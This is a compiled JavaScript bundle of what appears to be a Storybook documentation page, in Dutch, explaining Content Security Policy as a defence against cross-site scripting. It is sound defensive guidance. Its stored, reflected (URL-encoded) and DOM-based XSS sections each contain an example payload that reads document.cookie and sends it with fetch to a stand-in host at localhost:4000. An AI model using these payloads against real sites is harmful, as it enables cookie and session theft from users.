import{u as o,j as e,M as s}from"./iframe-DynOw9qF.js";import"./preload-helper-D9Z9MdNV.js";function i(t){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",p:"p",pre:"pre",ul:"ul",...o(),...t.components};return e.jsxs(e.Fragment,{children:[e.jsx(s,{title:"Richtlijnen/Content Security Policy/Wat Is CSP"}),`
`,e.jsx(n.h1,{id:"wat-is-csp",children:"Wat Is CSP"}),`
`,e.jsx(n.h2,{id:"inleiding",children:"Inleiding"}),`
`,e.jsx(n.p,{children:`Content Security Policy (CSP) is een beveiligingsmechanisme, te configureren in de HTTP-headers van je webapplicatie.
Het bepaalt welke bronnen (scripts, styles, afbeeldingen, fonts, iframes, etc.) een browser mag laden en
uitvoeren.`}),`
`,e.jsx(n.p,{children:`CSP is ontworpen om aanvallen als Cross-Site Scripting (XSS) en data-injectie te voorkomen. Zonder CSP kan een aanvaller
kwaadaardige inline scripts of externe bestanden injecteren en uitvoeren. Met CSP kun je dat beperken tot expliciet
vertrouwde bronnen.`}),`
`,e.jsxs(n.ul,{children:[`
`,e.jsx(n.li,{children:"Je kunt per type bron (script, style, img, font, frame, …) aangeven wat wél en niet mag."}),`
`,e.jsx(n.li,{children:`Inline scripts / styles worden standaard geblokkeerd, tenzij je ze expliciet toestaat (met 'unsafe-inline', nonces of
hashes).`}),`
`,e.jsx(n.li,{children:`CSP maakt het veel moeilijker voor aanvallers om via XSS code uit te voeren, de browser weigert alle ongeautoriseerde
content.`}),`
`]}),`
`,e.jsx(n.p,{children:`CSP is een extra beveiligingslaag bovenop secure coding en inputvalidatie. Het doel is niet alleen aanvallen te
blokkeren, maar ook om het aanvalsoppervlak te verkleinen en fouten sneller zichtbaar te maken tijdens ontwikkeling.`}),`
`,e.jsx(n.h2,{id:"cross-side-scripting",children:"Cross Side Scripting"}),`
`,e.jsxs(n.p,{children:[`Eén van de belangrijkste zaken waartegen je je kan beschermen met CSP is tegen Cross Side Scripting (XSS). Een uitleg
van wat XSS is vind je in het artikel `,e.jsx(n.a,{href:"https://auth0.com/blog/cross-site-scripting-xss",rel:"nofollow",children:"cross site scripting xss"}),`, hoe
je je dan met CSP daartegen kan beschermen staat uitgelegd in
`,e.jsx(n.a,{href:"https://auth0.com/blog/defending-against-xss-with-csp",rel:"nofollow",children:"defending against xss with csp"}),`. Voor toepassingen die een SPA
opzet volgen is er het specifiekere artikel `,e.jsx(n.a,{href:"https://auth0.com/blog/deploying-csp-in-spa",rel:"nofollow",children:"deploying csp in spa"}),"."]}),`
`,e.jsx(n.p,{children:`Het hoofddoel om CSP te activeren is om te zorgen dat een webtoepassing enkel eigen, vertrouwde code bevat en uitvoert.
Enkel de eigen geschreven / voorziene javascript, html en css mag getoond en uitgevoerd worden. Wijzigen, tonen of
uitvoeren van 'andere' code wordt afgeblokt.`}),`
`,e.jsx(n.p,{children:"Voorbeelden van XSS, die tegengehouden wordt, zijn:"}),`
`,e.jsx(n.h3,{id:"stored-xss-tegenhouden",children:"Stored XSS tegenhouden"}),`
`,e.jsx(n.p,{children:"In input velden zou malicious code ingevoerd kunnen worden conform:"}),`
`,e.jsx(n.pre,{children:e.jsx(n.code,{children:"<script>fetch(`http://localhost:4000?data=${document.cookie}`)<\/script>\n"})}),`
`,e.jsx(n.p,{children:`Als deze code dan (denk bvb. in het geval van een blog) door een andere gebruiker geopend en uitgevoerd wordt kunnen er
ongewenst gegevens gecapteerd worden.`}),`
`,e.jsx(n.h3,{id:"reflected-xss-tegenhouden",children:"Reflected XSS tegenhouden"}),`
`,e.jsx(n.p,{children:`Links (aangeboden via een href of verborgen via een shortening service) die refereren naar een toepassing kunnen
scripts bevatten:`}),`
`,e.jsx(n.pre,{children:e.jsx(n.code,{children:`http://localhost:3000/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A4000%3Fdata%3D%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E
`})}),`
`,e.jsx(n.h3,{id:"dom-based-xss-tegenhouden",children:"DOM based XSS tegenhouden"}),`
`,e.jsx(n.p,{children:"In de DOM kan (door via een malicious website omgeleid te zijn) geldige, maar kwaadwillige html gestoken zijn."}),`
`,e.jsx(n.pre,{children:e.jsx(n.code,{children:'<img src="noimage" onerror=fetch(`http://localhost:4000?data=${document.cookie}`)/>\n'})}),`
`,e.jsx(n.h3,{id:"css-xss-tegenhouden",children:"CSS XSS tegenhouden"}),`
`,e.jsxs(n.p,{children:["Zie het filmpje en de presentatie op ",e.jsx(n.a,{href:"https://mikewest.org/2013/09/xss-no-the-other-s-cssconfeu-2013",rel:"nofollow",children:"xss no the other s"}),"."]})]})}function d(t={}){const{wrapper:n}={...o(),...t.components};return n?e.jsx(n,{...t,children:e.jsx(i,{...t})}):i(t)}export{d as default};
